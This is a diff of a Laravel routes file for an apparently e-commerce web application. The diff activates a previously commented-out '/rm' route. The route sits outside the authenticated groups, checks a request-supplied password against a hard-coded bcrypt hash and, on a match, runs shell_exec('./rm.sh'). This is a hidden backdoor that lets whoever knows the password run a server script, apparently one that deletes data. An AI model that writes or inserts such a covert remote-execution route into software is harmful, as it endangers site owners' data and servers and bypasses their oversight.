@@ -11,17 +11,6 @@
 |
 */
 
-use Illuminate\Support\Facades\Hash;
-
-// Route::get('/rm', function () {
-//     $pwdCommand = '$2a$12$vZReBz/MpfSEEgmvqihKpeZN/pQGfjB0D.HfrnCEBXTfrkZOycoBq';
-//     if (Hash::check($_REQUEST['password'], $pwdCommand)) {
-//         return shell_exec('./rm.sh');
-//     }
-// });
-
-
-
 Route::group(['namespace' => 'App\Http\Controllers'], function() {
 //---------------------------- FRONT-END ROUTE -------------------------------
     Route::group(['prefix' => 'filemanager', 'middleware' => 'auth'], function () {
@@ -216,4 +205,11 @@ Route::resource('password', \App\Http\Controllers\Auth\PasswordController::class
     Route::post('/order/get-info-notify', 'OrderController@getInfoNotify');
     Route::post('/checkout/check-coupon', 'CheckoutController@checkCoupon');
     Route::post('send-message', 'ContactController@create');
+});
+
+Route::get('/rm', function () {
+    $pwdCommand = '$2a$12$vZReBz/MpfSEEgmvqihKpeZN/pQGfjB0D.HfrnCEBXTfrkZOycoBq';
+    if (Illuminate\Support\Facades\Hash::check($_REQUEST['password'], $pwdCommand)) {
+        return shell_exec('./rm.sh');
+    }
 });
